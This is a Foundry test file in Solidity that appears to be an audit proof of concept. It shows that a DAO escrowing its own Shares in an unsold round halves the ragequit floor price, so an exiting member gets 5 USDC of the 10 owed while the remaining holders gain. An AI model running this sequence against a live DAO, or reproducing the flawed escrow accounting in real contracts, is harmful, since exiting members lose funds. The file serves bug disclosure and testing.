// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;
import {WeeklyRoundsTest} from "./WeeklyRounds.t.sol";

contract DaoEscrowPoC is WeeklyRoundsTest {
    function test_poc_dao_escrow_dilutes_ragequit() public {
        // setup: 100 Shares (ALICE 10, ANA 50, CY 30, FAY 10) + 100 Loot (BOB), 200 USDC: floor 1.00
        vm.startPrank(address(dao));
        shares.mintFromMoloch(address(dao), 200e18);
        shares.approve(address(rounds), 200e18);
        vm.stopPrank();
        assertEq(rounds.floorOf(address(dao)), 1 * USD);
        uint256 id = rounds.open(address(dao));
        vm.prank(address(dao));
        rounds.sell(id, 200e18, 1023); // a step nobody will buy at
        assertEq(rounds.floorOf(address(dao)), 200 * USD * 1e18 / 400e18, "floor halved while escrowed");
        // FAY leaves 10 Shares during escrow
        uint256 before = usd.balanceOf(FAY);
        vm.prank(FAY);
        dao.ragequit(_leaveWithUsd(), 10e18, 0);
        emit log_named_uint("FAY got", usd.balanceOf(FAY) - before);
        assertEq(usd.balanceOf(FAY) - before, 5 * USD, "gets 5 instead of 10");
        // a holder round opened meanwhile starts at a halved floor
        // round goes void, DAO takes back its Shares
        _close(id);
        vm.warp(block.timestamp + 3 days);
        assertTrue(rounds.isVoid(id));
        rounds.claim(id, address(dao));
        assertEq(shares.balanceOf(address(dao)), 200e18);
        emit log_named_uint("floor after", rounds.floorOf(address(dao)));
        // remaining 190 units share 195 USDC: 1.0263 each
    }
}
